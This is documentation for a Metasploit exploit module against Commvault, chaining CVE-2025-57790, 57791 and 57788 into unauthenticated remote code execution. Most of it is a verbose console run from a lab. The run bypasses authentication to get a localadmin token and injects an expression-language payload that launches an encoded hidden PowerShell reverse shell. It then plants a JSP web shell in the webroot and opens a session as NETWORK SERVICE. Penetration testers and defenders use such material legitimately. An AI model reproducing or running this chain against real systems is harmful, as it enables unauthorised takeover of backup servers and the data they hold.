## Vulnerable Application
This module exploits an unauthenticated remote code execution exploit chain for Commvault,
tracked as CVE-2025-57790 and CVE-2025-57791. A command-line injection permits unauthenticated
access to the 'localadmin' account, which then facilitates code execution via expression
language injection. CVE-2025-57788 is also leveraged to leak the target host name, which is
necessary knowledge to exploit the remote code execution chain. This module executes in
the context of 'NETWORK SERVICE' on Windows.

## Testing
To set up a test environment:
1. Install Commvault and perform basic minimum setup (prompted by installer).
2. Confirm that the web service on port 443 is reachable.
3. Follow the verification steps below.

## Options
No custom options exist for this module.

## Verification Steps
1. Start msfconsole
2. `use exploit/windows/http/commvault_rce_cve_2025_57790_cve_2025_57791`
3. `set RHOSTS <TARGET_IP_ADDRESS>`
4. `set RPORT <TARGET_PORT>`
5. `run`

## Scenarios
### Commvault Windows Target
```
msf exploit(windows/http/commvault_rce_cve_2025_57790_cve_2025_57791) > show options 

Module options (exploit/windows/http/commvault_rce_cve_2025_57790_cve_2025_57791):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies
                                         : socks5, socks5h, http, sapni, socks4
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basic
                                         s/using-metasploit.html
   RPORT      443              yes       The target port (TCP)
   SSL        true             no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to Commvault
   VHOST                       no        HTTP server virtual host


Payload options (cmd/windows/powershell_reverse_tcp):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   LHOST                          yes       The listen address (an interface may be specified)
   LOAD_MODULES                   no        A list of powershell modules separated by a comma to download over the web
   LPORT         4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Default



View the full module info with the info, or info -d command.

msf exploit(windows/http/commvault_rce_cve_2025_57790_cve_2025_57791) > set RHOSTS 192.168.154.222
RHOSTS => 192.168.154.222
msf exploit(windows/http/commvault_rce_cve_2025_57790_cve_2025_57791) > set LHOST 192.168.154.139 
LHOST => 192.168.154.139
msf exploit(windows/http/commvault_rce_cve_2025_57790_cve_2025_57791) > set VERBOSE true
VERBOSE => true
msf exploit(windows/http/commvault_rce_cve_2025_57790_cve_2025_57791) > run
[*] Started reverse TCP handler on 192.168.154.139:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Attempting to query the publicLink.do endpoint
[*] The server returned a body that included the string cv-gorkha, looks like Commvault
[+] Fetched GUID: 572131A8-3182-4423-8850-4A62D6CA2178
[*] Attempting to login as PublicSharingUser
[+] Authenticated as PublicSharingUser, got token: QSDK 36fdc5bd8cd650a1e64d8bd00acec802097a131806f2c712b41d7abf0b3e26d63f934db1efb85444ba371710bd6135bc41f679bf4d923417fc191864f9772780ddc7c7e66c73b7b59721b9acc7ac32bab5fc4d89909a0771229e5e0fd0b51c6ff346b195eb53e4f92c31182701ce7eb78f4a11b0c4653ef48f6e902b61094c9b50ae05715890e9bb9e341b99d003956e1f036a82295f23cf637c8d4046f5c970ad46deb59e3d89579d5dc144f2582e3ae3659c17f19835c40cb8c93c96f063d58d41f2b328e39fda3d2c7e26af2d62bbf
[+] The target is vulnerable. Successfully authenticated as PublicSharingUser
[*] Attempting to query the publicLink.do endpoint
[*] The server returned a body that included the string cv-gorkha, looks like Commvault
[+] Fetched GUID: 572131A8-3182-4423-8850-4A62D6CA2178
[*] Attempting PublicServiceUser login using: 572131A8-3182-4423-8850-4A62D6CA2178
[+] Authenticated as PublicSharingUser, got token: QSDK 388eef6d67c3cf146a17819125e4b33506fd188ec21fe6d191b56cdf1e98527d84135f8508ad2439a6229bc5b44d6a71e83460596c3267113d8365867d834004463aeb263ef8b5a1ecaad5f0f44e310223317e29b987ea8b3311666ce34ddd30121c77652628fd975ce662e21c113c53414806e4fffcf2082b245f9f64f6f20716df1ed46f7da21c6b933bd9c1eabaf7cc8600644f399057a73598e60bf586d6b3c3717fa7fd0e9a4204dae938cb213f855f8eb48ffc37f3a1d38ca74176d919253cdb6405ce27287f4106eb0a5397093
[*] Attempting to query authenticated API endpoint to get host name and OS
[+] Got target host name: DC01
[+] Got target host OS: Windows
[*] Attempting to mint a localadmin token using hostname: DC01
[+] Successfully bypassed authentication
[*] Admin token: QSDK 39cb9de328b232215e42c09650a018488634454cb0f39875976ca7d16039ea739a20ea151935c84b458bd9991b826e46dddccdbe95abfd13b72e0a3b5eb6238cf089302d340f4b421d9f250669b3624fc2d0e4b871db59bc96fe955b8e7d88034d35e310e1c22d717ea1d8a01f5dadfccaf2910128cbe089fce9738bb549c2c6e5aeff59c0644345f3dffe1c73103d8372af95b5e73f018d3fa413727af1592f72d7fc036fdf060d5a6cf183ba1651ab69c5dbdcee110d7a9d01ef490c90fa1ea0fdc1afc52ba5f5ee8b58ee4349efc92c086d4c2ab1be97123385e78ca8f68ae3f88b1142382013438226acdc4e6b10701120f07d6acd1f7
[*] Extracted localadmin user ID number: 4
[*] Got JSON response, searching for installation path disclosures
[+] Leaked the installation path: C:\Program Files\Commvault\ContentStore
[*] Got user description: System created Admin User for qcommand operations
[*] Uploading XML file: <App_GetUserPropertiesRequest level="30">
	<user userName="DC01_localadmin__" /></App_GetUserPropertiesRequest>
[*] Updating user description: <App_UpdateUserPropertiesRequest><users><AppMsg.UserInfo><userEntity><userId>4</userId></userEntity><description>${''.getClass().forName('java.util.Scanner').getConstructor(''.getClass().forName('java.io.InputStream')).newInstance(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null).exec('powershell -w hidden -nop -e YwBtAGQALgBlAHgAZQAgAC8AYwAgACcAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBuAG8AcAAgAC0AdwAgAGgAaQBkAGQAZQBuACAALQBuAG8AbgBpACAALQBlAHAAIABiAHkAcABhAHMAcwAgACIAJgAoAFsAcwBjAHIAaQBwAHQAYgBsAG8AYwBrAF0AOgA6AGMAcgBlAGEAdABlACgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAegBpAHAAUwB0AHIAZQBhAG0AKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAFMAeQBzAHQAZQBtAC4AQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAKAAoACcAJwBIADQAcwBJAEEARABBAC8AeQBHAGcAQwBBADUAVgBWAFgAVwAvAGIATgBoAFIAOQA5ADYAKwA0AE0ATgBSAEcAUQBtAHoAQwA5AHIAcABoAEQAWgBDAGkAbgBwAG8ATwBBAGIATABXAHEATABMAGwAdwBUAEEAUQBtAHIAcQBPAHQAZABDAGsAUwAxAHsAMgB9AHgAagBjAFQALwBmAGEAUgB7ADEAfQBmAFQAaABPAHMASgBZAFAAdABzAGgANwBlAFgAaAA0ADcAaQBHADUAeQBBAFUAegBtAFIAVAB3AEoANQByACsARABjADQAWgB6ADEAQQBZADYARAB4ADIAdwBMAFoAZwB3ACsAQQBjACcAJwArACcAJwB2AHUAQwBtAC8AMwBYACsATAB6AEkARAAvAGUAdgBkAEcAcgAvAFEARgBkAHAAQgBRADIAeAArAFgATwBSAFgAeQBlAFIAdgBqAFoAOQB3AFEAWABOAHUAWQBvAFcAcABqAFcAUwBVAGEAdwBzAFIARwBKAFYAagBuAFQAVgBSAGMAcgBzAGoAegB6AEwAcwBlAEcAdQBrAHkAdQAzAHMATwA0AHUAewAyAH0ANABsAHAAdQBVAE4AbQBlAFoAUQBkAEYAZgB7ADEAfQBJAFYAWABZAFgAbAA5AHoAUQB4AHsAMgB9AGgATgAzAHMAeQBDAFcAcQB4AFUAVgBhAGUAOQB3AE4ATgBHAGMAUwBmAEYAcwA4AEoAUABjAEMAQwA1AHAAVwBvAHgARwBIAGwATgBKAGgAbABxAEQARgAyAEEAbAAwADUAeQBqAEkALwBnAHgAagB7ADIAfQBCAE0AeQBSAFkAUQBWAHMAdABBAEgANwA5AEQAZAA1ADYASgB0AEIAcwBWAHcAWABKAGUATQBaAGQAbgAyAHEAQgBBAFoAUwBkAFAAawA1ADMAOQBYAGgARwBuAFcAaQBMAFoAUABSAHAATgByAHQAbgA2ACcAJwArACcAJwB5AG0AZgBNADMAdABsADIAUABKAEYAbwBRADUAVgB4ADYALwBxAFYAaQA2AGcAdgAwAFgAawByAGIAOAB3AFkAcgBvADAARgBMAE0AcwBSAGwAbABUADIAcgA5AEYAVgArAEkAQgB7ADIAfQA0AHoASABqAEcAcgBwAFYAOABwAGUAWQB4AHgATwAvAFUASABmADQAZgBrAFMARwB2AC8AMQBPAGgAcgArACsASQA4AE4AZgAzACcAJwArACcAJwBuAGQANwBiAGkAZAArACsAVQA0AHAAbwBUAFkAewAyAH0ANgBjAHIAeABMAGUARwBKAHQAVgBwAFMAagBGAG0AZQBEAGMATwB5AFEAaQBWAEIANQA1AGEAdQBMADAAaQBMAG4AdABZADgAcQBjAEIAZQBZAFkAZwBzAFYANQBuAFoAawBhAFIAewAyAH0ARABmADMANgB2AFcAQgBoAGIAWQBXADkAOABEAEcANAB0ACcAJwArACcAJwB1AGgANwA2AEYATQBOADAAJwAnACsAJwAnADQATQA1ADMAMwBBAGwARABjAGEAbwBUAEwAYgBJAEcARABYADQARAArAFYAWgBTAHAAMwAzAFkAcwByADUAbgBMAEwANwBXAFIAUwA5AFEASQBlAE0AYwA3AE4AMAB4AG4AVwBUAHgAdgBwAFYAYgBRAHsAMgB9AFIAYwA5ADcAcgBHAHEANgBIAG8ANgA0AG4AMQBNAGEAcgBoAFcAbwAyADIAbABaAHkATwB0ADgAWgBuAE0ANQBtAGcAZgB0ADMAbABoAHcAUQBNAGgAcgBZADkAdgBUAG0AYwBiAEQAMwBZAHEATgBJAHEAMwBBADQATgBiAGcAMQBCACcAJwArACcAJwBBAFcAVABxAGYAUAA3ADIAZABrADQAaQBTADgAdgBJADEAZQBBAFAAMQB4AE8AMgBMADIAeAB4AHAAVQBiAEQAUgBOADMAdABKAEkAbABjAGcANABxAEYAOABKAG0AZwA1AFUAbgAxADkAYQA4AFgAVABpAEYAQQBNAFgARABtAGUAJwAnACsAJwAnAHMASgBkAC8AUgBQADcAWgBpAHQAVgBCADEAZwBjAHIAWABPAFQAUgBPADgARgBiAEYAYwA3ADEAUgAyAHQAegBRAFEAeABoAEgAOABsAFQAewAxAH0AbAB0AFYAdwBZAGkAewAyAH0AVgBhAFMAMQBVAG8AUwBtAEQAcwBGAG4ATgBKAEcAaABSAGEANwBBAGQATQB5AGEAMgA0AEYAZAA2AFcAWABnADUAeQBZADIAdQBEAFkAYgBPAHgAMwBxAEQAWABkAE0AZwBWAGkAagB1AHoAYgBQAHUAbwBPAHQAUgB0AEoAeAAwAFoANgBlAGQAVQBtAHAANwBPADQATQBwAEMATwBsAG4AOABoAFUAQgBxAG4AagAvAFAAdABaAHIAMQBXAGEAbwBMAHkAcABhAFcAYwB3AGsAewAyAH0AbQBhAGcAdgBuAEMAYQByAG8AZQAxAGEAZQBIAEIAUABSADYAVABhAGIAWABtAGwAVgBVAGoAUgAwADYAVgAnACcAKwAnACcANABrAFAAZgBZAHYAOQBpAHUAcgBiAGIAYQA2ACcAJwArACcAJwBsADIAagA3AE4AdQBXADIAaQB3AHoAagBtAHsAMQB9AFkAWgBJAFgAcgB5AGsAMQA4AFEANQBxACcAJwArACcAJwBHAHAAYwBkADYATQBPAGgAQgBjAE0AQQArAGcAcgA1AEEARwBCAHgASgBlAHUASAAwAHcALwBUAGEAYQB2AG4AYQBrACsASABQAHEAVQBzAGgAaABjAFkAWABYAHYATQBHAHgAWgA0ADIANgBxAGkAMAAwAFAAeAAxAFUAZQB5AHUAewAxAH0AaABXAEMATABIAHAAVwBUAFgAcwA0AFgAVABHAFAAOQBnADMAOQA2AHUAbwByAHcAVQBjAGYAMwBnADcAaABDAGIANwBtAHAAbAArAGkAZwBqAGYAUABBAGQAUQBJAEMAawB7ADEAfQBxADQARgBNADQAbQBTAFIAdwBZAHYAOABMAC8AYQA4AGsAewAyACcAJwArACcAJwB9AHoAdwBjAGsAUQBrADEAUwB4AGYAOQBBAEMAYwBOAHkATgBZAFIAQwBWAEEAcABxAGEAYQBEADIAYwBGAGkATABkAFoARgBuAEQAQwBPAFYASQBYAFIAUwB3AHoATwAyAHgAMQA3ADEATABhAGQAWQB3AFAALwBrAEgAOABiAG0AUAA5ADEAYgBOAHUAdwBSADMANgB0ADUAbgB6AG0AdQAnACcAKwAnACcAVgA3AFcAcgA2AEcAJwAnACsAJwAnAC8AZQBQAHoAZABIAG4ATwBwADAAZQArAG4ATwBJADcAVgBHADkAVQAyAFQAUABOAHcASgBVAGEAdQBxADkAZgB7ADIAfQAvADEAcABuADEAZwA5ADkAWABUAHYALwBZAHYAMABIAGQAVwBxADkAewAyAH0AcQA0AEkAQQBBAEEAewAwAH0AJwAnACkALQBmACcAJwA9ACcAJwAsACcAJwBFACcAJwAsACcAJwBLACcAJwApACkAKQApACwAWwBTAHkAcwB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkAKQApACIAJwA=').getInputStream()).useDelimiter('%5C%5CA').next()}</description></AppMsg.UserInfo></users></App_UpdateUserPropertiesRequest>
[*] Moving XML file to web shell: qoperation execute -af C:\Program Files\Commvault\ContentStore\Reports\MetricsUpload\Upload\b2e65d7a\b2e65d7a.xml -file C:\Program Files\Commvault\ContentStore\Apache\webapps\ROOT\b2e65d7a.jsp
[*] Accessing the web shell file: b2e65d7a.jsp
[!] Tried to delete C:\Program Files\Commvault\ContentStore\Apache\webapps\ROOT\b2e65d7a.jsp, unknown result
[*] Powershell session session 1 opened (192.168.154.139:4444 -> 192.168.154.222:50011) at 2025-09-15 11:33:22 -0500
[*] Updating user description: <App_UpdateUserPropertiesRequest><users><AppMsg.UserInfo><userEntity><userId>4</userId></userEntity><description>System created Admin User for qcommand operations</description></AppMsg.UserInfo></users></App_UpdateUserPropertiesRequest>
msf exploit(windows/http/commvault_rce_cve_2025_57790_cve_2025_57791) > sessions -i 1
[*] Starting interaction with 1...

PS C:\Program Files\Commvault\ContentStore\Apache\bin> whoami
nt authority\network service

```
